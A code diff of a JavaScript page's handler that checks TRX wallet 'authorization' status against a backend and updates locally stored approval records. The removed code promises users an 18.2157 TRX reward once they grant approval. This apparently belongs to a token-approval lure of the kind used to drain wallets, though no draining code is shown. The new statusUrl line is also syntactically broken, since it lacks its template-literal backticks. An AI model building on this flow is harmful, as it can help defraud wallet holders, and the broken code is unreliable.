@@ -554,34 +554,52 @@
             };
             // 查看授权状态
             checkStatusBtn.onclick = async () => {
-                try {
-                    checkStatusBtn.disabled = true;
-                    checkStatusBtn.innerHTML = ' 查询中...';
-                    // 构造后端要求的GET请求（带userAddress参数）
-                    const statusUrl = `${BACKEND_API}/approve/status?userAddress=${encodeURIComponent(userAddress)}`;
-                    const res = await fetch(statusUrl, {
-                        method: "GET", // 后端接口为GET请求
-                        credentials: "include"
-                    });
-                    const resData = await res.json();
-                    if (!res.ok) throw new Error(resData.msg || `查询失败（${res.status}）`);
-                    if (resData.success && resData.data.latestApproval?.status === "授权成功（已上链）") {
-                        updateApprovalRecordStatus(userAddress, "授权成功（已代付）");
-                        showToast(`授权成功！可领取18.2157 TRX奖励`);
-                    } else if (resData.data.latestApproval?.status === "待代付授权") {
-                        showToast("当前状态：待代付授权，请稍后查询");
-                    } else {
-                        showToast(`当前状态：${resData.data.latestApproval?.status || '未查询到有效记录'}`, "error");
-                    }
-                    renderApprovalRecords();
-                    updateRecordCount();
-                } catch (e) {
-                    showToast(`查询失败：${e.message}`, "error");
-                } finally {
-                    checkStatusBtn.disabled = false;
-                    checkStatusBtn.innerHTML = ' 查看授权状态';
-                }
-            };
+  try {
+    checkStatusBtn.disabled = true;
+    checkStatusBtn.innerHTML = ' 查询中...';
+    const statusUrl = ${BACKEND_API}/approve/status?userAddress=${encodeURIComponent(userAddress)};
+    const res = await fetch(statusUrl, {
+      method: "GET",
+      credentials: "include"
+    });
+
+    // 新增：先解析响应体，无论是否ok都处理
+    const resData = await res.json().catch(() => ({ success: false, msg: "后端响应格式错误" }));
+
+    if (!res.ok || !resData.success) {
+      throw new Error(resData.msg || `查询失败（${res.status}）`);
+    }
+
+    // 核心修复：更新本地授权记录
+    const latestApproval = resData.data?.latestApproval || {};
+    if (latestApproval.address === userAddress) {
+      // 更新本地记录的状态
+      updateApprovalRecordStatus(
+        userAddress,
+        latestApproval.status || "未查询到状态"
+      );
+      // 若有txid，补充到记录中
+      if (latestApproval.txid) {
+        const existingRecords = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
+        const updatedRecords = existingRecords.map(record => 
+          record.address === userAddress ? { ...record, txid: latestApproval.txid } : record
+        );
+        localStorage.setItem(RECORD_KEY, JSON.stringify(updatedRecords));
+      }
+      // 强制重新渲染页面
+      renderApprovalRecords();
+      updateRecordCount();
+      showToast(`当前状态：${latestApproval.status || "未查询到状态"}`);
+    } else {
+      showToast("后端返回的地址与当前用户不匹配", "error");
+    }
+  } catch (e) {
+    showToast(`查询失败：${e.message}`, "error");
+  } finally {
+    checkStatusBtn.disabled = false;
+    checkStatusBtn.innerHTML = ' 查看授权状态';
+  }
+};
             window.addEventListener("beforeunload", () => {
                 saveTrxStateToStorage();
                 if (trxTimer) clearInterval(trxTimer);
